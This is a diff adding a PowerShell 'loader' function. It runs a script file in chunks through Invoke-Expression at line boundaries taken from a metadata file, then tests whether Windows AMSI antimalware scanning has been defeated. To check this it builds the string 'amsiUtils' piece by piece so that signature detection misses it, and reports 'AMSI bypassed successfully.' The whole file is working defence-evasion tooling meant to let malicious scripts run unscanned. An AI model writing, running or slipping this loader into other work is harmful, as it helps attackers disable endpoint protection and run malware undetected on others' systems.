@@ -1,0 +1,54 @@
+function loader {
+    param (
+        [Parameter(Mandatory=$true)]
+        [string]$filePath,
+        [Parameter(Mandatory=$true)]
+        [string]$metadataPath
+    )
+
+    if (-Not (Test-Path $filePath)) {
+        Write-Host "The file $filePath does not exist."
+        return
+    }
+
+    if (-Not (Test-Path $metadataPath)) {
+        Write-Host "The file $metadataPath does not exist."
+        return
+    }
+
+    $linesArray = Get-Content -Path $filePath
+    $numberArray = Get-Content -Path $metadataPath
+    $firstLine = 0
+
+    foreach ($lineNumber in $numberArray) {
+        if ($lineNumber -gt $linesArray.Length) {
+            Write-Host "The file $filePath does not have $lineNumber lines."
+            return
+        }
+
+        $scriptBlockContent = $linesArray[$firstLine..($lineNumber-1)] -join "`n"
+        $firstLine = $lineNumber
+
+        try{
+            Invoke-Expression $scriptBlockContent -ErrorAction Stop | Out-Null
+        } catch {
+            Write-Host "Error executing lines from $firstLine to $lineNumber from the file $filePath."
+            throw $_.Exception
+        }
+    }
+
+    try {
+        $command = 'am' + 's' + 'I' + 'u' + 'TI' + 'l' + 's'
+
+        Invoke-Expression $command -ErrorAction Stop | Out-Null
+
+        Write-Host "Success: AMSI bypassed successfully."
+
+    } catch {
+        if ($_.Exception.Message -like '*malintencionados*' -or $_.Exception.Message -like '*malicious*') {
+            Write-Host "Error: AMSI is still active."
+        } else {
+            Write-Host "Success: AMSI bypassed successfully."
+        }
+    }
+}
